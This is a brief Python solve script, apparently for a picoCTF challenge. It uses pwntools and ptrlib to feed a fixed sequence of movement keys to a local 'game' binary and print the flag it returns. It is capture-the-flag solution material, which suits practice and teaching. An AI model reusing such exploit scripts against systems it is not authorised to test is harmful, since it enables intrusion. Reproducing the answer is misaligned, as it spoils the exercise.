#!/usr/bin/env python
import pwn
import ptrlib as ptr

# io = pwn.process("./game")
# io = pwn.remote("saturn.picoctf.net", 56141)
io = ptr.Process("./game")

for i in range(4):
    io.sendline(b"w")

for i in range(8):
    io.sendline(b"a")

io.sendline(b"p")
io.recvuntil(b"flage\n")
print(io.recvline())
